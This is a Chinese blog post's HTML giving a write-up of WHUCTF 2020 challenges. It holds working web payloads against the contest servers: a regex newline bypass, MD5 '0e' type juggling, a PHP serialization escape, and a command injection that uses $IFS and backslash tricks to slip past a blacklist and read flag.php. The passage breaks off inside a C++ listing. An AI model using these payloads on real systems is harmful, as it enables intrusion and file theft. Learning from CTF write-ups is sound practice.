@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="GJ6UJFBp7N">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.ofortune.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第一次打CTF，体验了被大佬碾压的感觉。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="武汉大学第二届“珞格杯”校园CTF大赛部分题目Writeup">
+<meta property="og:url" content="https://blog.ofortune.xyz/2020/05/27/whuctf-2020-writeup/index.html">
+<meta property="og:site_name" content="Silent World">
+<meta property="og:description" content="第一次打CTF，体验了被大佬碾压的感觉。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-1.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-2.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-3.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-4.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-5.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-6.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-7.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-8.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-9.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-10.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-11.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-12.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-13.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-14.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-15.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-16.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-17.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-18.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-19.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-20.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-21.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-22.webp">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/whuctf2020-23.webp">
+<meta property="article:published_time" content="2020-05-27T12:12:55.000Z">
+<meta property="article:modified_time" content="2020-05-27T12:12:55.000Z">
+<meta property="article:author" content="Paul">
+<meta property="article:tag" content="debugging">
+<meta property="article:tag" content="assembly">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.ofortune.xyz/images/whuctf2020-1.webp">
+
+<link rel="canonical" href="https://blog.ofortune.xyz/2020/05/27/whuctf-2020-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>武汉大学第二届“珞格杯”校园CTF大赛部分题目Writeup | Silent World</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91325067-5"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-91325067-5');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?838eea07a477dca863f82689af68d775";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Silent World</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Paul's notes</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.ofortune.xyz/2020/05/27/whuctf-2020-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paul">
+      <meta itemprop="description" content="thoughts,stories,experiences">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Silent World">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          武汉大学第二届“珞格杯”校园CTF大赛部分题目Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-27 20:12:55" itemprop="dateCreated datePublished" datetime="2020-05-27T20:12:55+08:00">2020-05-27</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第一次打CTF，体验了被大佬碾压的感觉。</p>
+<a id="more"></a>
+<p>总的来说，游戏体验极佳，<del>不会的题用多少时间还是不会</del></p>
+<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>题目是一个<code>Git</code>仓库，先看一下<code>remote</code></p>
+<p><img src="/images/whuctf2020-1.webp" alt="checkin-1"></p>
+<p>然后找到了<code>flag</code></p>
+<p><img src="/images/whuctf2020-2.webp" alt="checkin-2"></p>
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>地址：<span class="exturl" data-url="aHR0cDovLzIxOC4xOTcuMTU0Ljk6MTAwMTUv">http://218.197.154.9:10015/<i class="fa fa-external-link-alt"></i></span></p>
+<p>打开后发现是<code>php</code>代码审计题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">会代码审计嘛<span class="number">23333</span></span><br></pre></td></tr></table></figure>
+<p>先解决第一个，主要是绕过正则<code>preg_match(&#39;/^23333$/&#39;, $_GET[&#39;num&#39;])</code>这里使用<code>%0a</code>换行绕过。第一个<code>payload</code>:<code>num=23333%0a</code></p>
+<p>然后第二个是<code>php</code>的<code>md5</code>比较问题，<code>php</code>是弱类型语言，这里考虑用<code>0e</code>开头后面全为数字的字符串会转换为浮点数来绕过<code>md5</code>比对，这里题目有一个字母替换，那么<code>0e</code>后面还允许出现<code>pgnb</code>四个字母。写一个脚本爆破就好了:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999999999</span>):</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    j = md5(str(i))</span><br><span class="line">    <span class="keyword">if</span> j[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> j[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> z <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"0123456789pgnb"</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"found md5("</span>+str(i)+<span class="string">")="</span>+j)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/whuctf2020-3.webp" alt="ezphp-1"></p>
+<p>这里随便挑两个就可以了。第二个<code>payload</code>:<code>str1=11230178&amp;str2=113619666</code></p>
+<p>还剩下第三个序列化与反序列化的问题:</p>
+<p>正常情况下序列化后的字符串为：<code>a:2:{i:0;s:5:&quot;hello&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code>这里面<code>username</code>是可控的，考虑用<code>username</code>覆盖掉后面的东西。于是构造<code>hello&quot;;i:1;s:6:&quot;123456&quot;;}</code>。接下来就剩一个长度的问题，好在这里有一个<code>x</code>和<code>yy</code>的替换，用来凑长度，所以构造<code>helloxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}</code>,编码后发送POST:<code>username=helloxxxxxxxxxxxxxxxxxxxx%22%3Bi%3A1%3Bs%3A6%3A%22123456%22%3B%7D</code></p>
+<p>最后拿到<code>flag</code>:<code>whuctf{f4f9b4cd-e80e-4570-9b82-013d257c0756}</code></p>
+<h2 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h2><p>地址：<span class="exturl" data-url="aHR0cDovLzIxOC4xOTcuMTU0Ljk6MTAwMTYv">http://218.197.154.9:10016/<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/tac|rm|echo|cat|nl|less|more|tail|head/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"cat't read flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里涉及到命令行的构造</p>
+<p>先看一下本地文件：<code>http://218.197.154.9:10016/?ip=127.0.0.1|ls</code>得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line">hahaha</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">--snip--</span><br></pre></td></tr></table></figure>
+<p>这个题过滤了一堆关键词，所以一开始想到可以用<code>base64</code>来绕过，然而好像没有结果….</p>
+<p>因为不能按顺序出现<code>flag</code>四个字符所以这里尝试从<code>ls</code>里面提取出<code>flag.php</code>来绕过。于是通过<code>ls|head -n1</code>得到。</p>
+<p>然后配合<code>cat</code>得到原始的脚本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat &#96;ls|head -n1&#96;</span><br><span class="line">然后绕过cat和head匹配</span><br><span class="line">ca\t &#96;ls|he\ad -n1&#96;</span><br><span class="line">接着用$IFS$1来充当空格</span><br><span class="line">ca\t$IFS$1&#96;ls|he\ad$IFS$1-n1&#96;</span><br><span class="line">接上前面的127.0.0.1得到完整的payload</span><br><span class="line">http:&#x2F;&#x2F;218.197.154.9:10016&#x2F;?ip&#x3D;127.0.0.1|ca\t$IFS$1&#96;ls|he\ad$IFS$1-n1&#96;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/whuctf2020-4.webp" alt="ezcmd-1"></p>
+<h2 id="bivibivi"><a href="#bivibivi" class="headerlink" title="bivibivi"></a>bivibivi</h2><p>先是一个同余方程，暴力求解就好了。</p>
+<p>然后，使用<code>bilibili</code>官方的接口转换：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;api.bilibili.com&#x2F;x&#x2F;web-interface&#x2F;archive&#x2F;stat?bvid&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;api.bilibili.com&#x2F;x&#x2F;web-interface&#x2F;archive&#x2F;stat?aid&#x3D;</span><br></pre></td></tr></table></figure>
+<h2 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h2><p>先通过<code>string</code>快速定位代码：</p>
+<p><img src="/images/whuctf2020-5.webp" alt="RE1-1"></p>
+<p>然后可以确定输入格式：7位字符串</p>
+<p><img src="/images/whuctf2020-6.webp" alt="RE1-2"></p>
+<p>然后下个断点，动态调试：</p>
+<p><img src="/images/whuctf2020-7.webp" alt="RE1-3"></p>
+<p>随便输入一个:<code>1234567</code></p>
+<p><img src="/images/whuctf2020-8.webp" alt="RE1-4"></p>
+<p>先一个循环把输入的数据都丢到栈里：</p>
+<p><img src="/images/whuctf2020-9.webp" alt="RE1-5"></p>
+<p>然后判断第5个数是否是<code>5</code></p>
+<p><img src="/images/whuctf2020-10.webp" alt="RE1-6"></p>
+<p>这里先把输入的数设为$x_1x_2x_3x_4x_5x_6x_7$</p>
+<p>现在已经有了$x_5=5$</p>
+<p>然后是一个循环计算$x_p+x_q+x_r$并判断是否等于$15$</p>
+<p><img src="/images/whuctf2020-11.webp" alt="RE1-7"></p>
+<p>其中有两个特殊的数</p>
+<p><img src="/images/whuctf2020-12.webp" alt="RE1-8"></p>
+<p>这里经过调试得出了需要满足的方程，最后的<code>flag</code>就是输入的数据。</p>
+<script type="math/tex; mode=display">
+\begin{cases}
+x_5=5\\
+x_1+x_2+x_3=15\\
+x_1+x_4+x_7=15\\
+x_4+x_5+x_6=15\\
+x_2+x_5+9=15\\
+x_7+9+2=15\\
+x_3+x_6+2=15\\
+\end{cases}</script><p>熟悉的线代，这里考虑到题目<code>hint</code>中说明数字不重复加之$0\le x_i\le 9$最后枚举得到答案$8163574$，<code>flag</code>:<code>WHUCTF{8163574}</code></p>
+<h2 id="RE4"><a href="#RE4" class="headerlink" title="RE4"></a>RE4</h2><p>这道题很有意思，就每个子任务而言难度不大，但是我做的时候摆着的<code>0 solve</code>就说明这玩意不普通。</p>
+<p><code>nc 218.197.154.9 10055</code></p>
+<p>这道题会给出三个<code>base64</code>编码的程序，然后每题有大约<strong>十秒</strong>时间作答，大致格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Here is your challenge:</span><br><span class="line"></span><br><span class="line">--snip--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Please give me your answer</span><br></pre></td></tr></table></figure>
+<p>好在给的三个程序只有参数变了，程序主体没变，所以可以直接定位特征值</p>
+<p>第一个程序：</p>
+<p><img src="/images/whuctf2020-13.webp" alt="RE4-1"></p>
+<p><img src="/images/whuctf2020-14.webp" alt="RE4-2"></p>
+<p>F5大法好，第一题提取两个数字然后计算<code>v1</code>就好了</p>
+<p>第二个程序：</p>
+<p><img src="/images/whuctf2020-15.webp" alt="RE4-3"></p>
+<p>又是熟悉的线代</p>
+<p>第三个程序：</p>
+<p><img src="/images/whuctf2020-16.webp" alt="RE4-4"></p>
+<p>emm，这个不太便于人类阅读，稍微整理一下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">get</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> v16)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">long</span> <span class="keyword">long</span>)v16 &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">double</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)(v16 &amp; <span class="number">1</span> | (v16 &gt;&gt; <span class="number">1</span>)) + (<span class="keyword">double</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)(v16 &amp; <span class="number">1</span> | (v16 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">double</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)v16;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> v16, v17, v18;</span><br><span class="line">	<span class="keyword">double</span> v0, v2, v4;</span><br><span class="line">	<span class="keyword">double</span> v1, v3, v5;</span><br><span class="line">	<span class="keyword">int</span> result;</span><br><span class="line">	<span class="keyword">double</span> v6, v7, v8, v9, v10, v11, v12, v13, v14;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%llu"</span>, &amp;v16);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%llu"</span>, &amp;v17);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%llu"</span>, &amp;v18);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">double</span> num1 = <span class="number">0.9649508586</span>, num2 = <span class="number">0.5710826147</span>, num3 = <span class="number">0.6850006378</span>, num4 = <span class="number">2828711767.137764</span>;</span><br><span class="line">	<span class="keyword">double</span> num5 = <span class="number">0.0983183541</span>, num6 = <span class="number">-0.0359730015</span>, num7 = <span class="number">-0.1756920395</span>, num8 = <span class="number">-148776883.7387032</span>;</span><br><span class="line">	<span class="keyword">double</span> num9 